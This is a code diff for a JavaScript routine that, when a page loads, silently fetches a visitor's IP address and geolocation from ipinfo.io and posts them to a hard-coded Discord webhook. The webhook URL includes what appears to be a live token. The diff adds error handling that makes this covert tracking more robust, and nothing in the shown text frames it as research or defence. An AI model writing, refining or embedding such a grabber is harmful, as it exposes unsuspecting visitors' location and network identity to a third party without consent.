@@ -2,6 +2,9 @@
 async function getIPAndLocationAndSendToDiscord() {
     try {
         const response = await fetch('https://ipinfo.io/json');
+        if (!response.ok) {
+            throw new Error('Failed to fetch IP information');
+        }
         const data = await response.json();
         
         // Construct the message with content in a code block
@@ -27,14 +30,21 @@ async function getIPAndLocationAndSendToDiscord() {
 async function sendToDiscord(message) {
     const webhookURL = 'https://discord.com/api/webhooks/1231897922509996093/m747ZtKM1CnTXp4o_MHXcKCnarPZ-2oyUvXMgwjrpFmmA-VMqqqj_nP7Y5VIhHKwHNsr'; // Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL
 
-    // Send the message to Discord
-    await fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ content: message }),
-    });
+    try {
+        // Send the message to Discord
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: message }),
+        });
+        if (!response.ok) {
+            throw new Error('Failed to send message to Discord');
+        }
+    } catch (error) {
+        console.error('Error sending message to Discord:', error);
+    }
 }
 
 // Call the function to get IP address, location, and send to Discord when the page loads
